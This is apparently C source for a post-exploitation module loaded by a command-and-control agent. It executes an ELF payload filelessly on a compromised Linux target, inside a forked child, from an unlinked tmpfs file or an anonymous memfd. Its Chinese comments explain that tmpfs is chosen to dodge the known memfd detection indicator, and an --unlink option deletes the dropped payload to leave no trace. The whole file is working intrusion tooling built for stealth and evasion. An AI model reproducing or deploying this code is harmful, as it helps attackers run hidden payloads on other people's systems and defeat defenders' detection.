/// memfd_exec.c — BOF: execute an ELF filelessly, fork-isolated
/// Compile: gcc -c -o memfd_exec.o memfd_exec.c -include bof_api.h -Os -fPIC
/// Usage: execute bof memfd_exec.o <path-to-elf-on-target> [--unlink]
///
/// Flow: read ELF -> fork (crash isolation: the exploit runs in the child,
/// an exploit crash cannot kill the agent) -> child: build an in-memory
/// executable carrier + exec it via /proc/self/fd/N -> parent: waitpid and report.
///
/// 载体（P1-b，方案 §3.4 / 清单 A5·B5·B6）：首选 AxTmpfsCarrier —— tmpfs 文件写完
/// 立刻 unlink，/proc/<pid>/{exe,maps,fd} 显示 "<dir>/.mXXXX (deleted)"；内核把
/// memfd 的名字**硬编码**成 "/memfd:<name>"，"这是 memfd" 本身就是一级 fileless
/// 执行 IOC，随机化后缀躲不掉。tmpfs 同为内存文件系统，无盘属性不变。拿不到
/// tmpfs（或 execve 被拒：noexec 挂载 / LSM）时退回匿名 memfd。
///
/// --unlink: unlink the source before execve (方案 §3.2)。矩阵链把载荷上传到
/// tmpfs 中转文件后带这个参数，跑完不留文件。顺序要紧：先 unlink 再 fexecve 失败
/// 就丢了载荷；载体写完再 unlink 不会。

#include "bof_api.h"

#define O_WRONLY   01
#define O_CREAT    0100
#define O_TRUNC    01000
#define MFD_CLOEXEC 0x0001U

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    int path_len = 0;
    char *path = BeaconDataExtract(&parser, &path_len);
    if (!path || path_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] memfd_exec: missing path argument\n");
        return;
    }
    // BeaconDataExtract returns a length-delimited slice WITHOUT a NUL
    // terminator.  Copy it into a local buffer and terminate THERE: the slice
    // is the last field of the blob, so `path[path_len] = '\0'` (the previous
    // code) wrote one byte past the end of the argument buffer.
    char fpath[512];
    if (path_len >= (int)sizeof(fpath)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] memfd_exec: path too long\n");
        return;
    }
    AxMemcpy(fpath, path, path_len);
    fpath[path_len] = '\0';

    int unlink_src = 0;
    if (parser.length > 0) {
        int l2 = 0;
        char *t2 = BeaconDataExtract(&parser, &l2);
        if (t2 && l2 == 8 && AxStrncmp(t2, "--unlink", 8) == 0) unlink_src = 1;
    }

    char *payload = (char *)0;
    int plen = AxReadFileToBuffer(fpath, &payload, 64 * 1024 * 1024);
    if (plen <= 0 || !payload) {
        BeaconPrintf(CALLBACK_ERROR, "[-] memfd_exec: cannot read %s\n", fpath);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] memfd_exec: %d bytes loaded, forking...\n", plen);

    int pid = AxFork();
    if (pid < 0) {
        AxFree(payload);
        BeaconPrintf(CALLBACK_ERROR, "[-] memfd_exec: fork failed\n");
        return;
    }

    if (pid == 0) {
        // ── Child: fileless exec; replaced on success ──
        // 这里不需要 AxTmpfsCarrier 的回退读端：payload 本来就在内存里，
        // memfd 回退直接拿它再写一份，不必从 fd 读回。
        int via_tmpfs = 0;
        int cfd = AxTmpfsCarrier(payload, plen, (int *)0);
        if (cfd >= 3) {
            via_tmpfs = 1;
        } else {
            cfd = AxMemfdCreateRandom(MFD_CLOEXEC);
            if (cfd < 3) AxExit(1);
            if (AxWriteFile(cfd, payload, plen) != plen) AxExit(2);
        }
        if (unlink_src) AxUnlink(fpath);
        AxExecFd(cfd);   // never returns on success

        // execve 被拒（noexec 挂载 / LSM 拒绝该路径执行）—— 这种拒绝不是"能不能写"
        // 能预判的，所以拿一次真实 execve 当探针。走到这里载荷还没起来，
        // payload 仍在内存，退回匿名 memfd 再试一次；只有 tmpfs 那条路才值得重试。
        if (via_tmpfs) {
            int mfd = AxMemfdCreateRandom(MFD_CLOEXEC);
            if (mfd >= 3 && AxWriteFile(mfd, payload, plen) == plen) AxExecFd(mfd);
        }
        AxExit(3);       // exec failure
    }

    // ── Parent: wait and report ──
    int status = 0;
    int r = AxWaitPid(pid, &status);
    AxFree(payload);
    if (r < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] memfd_exec: waitpid failed\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] memfd_exec: child exited, status=0x%x\n", status);
    }
}
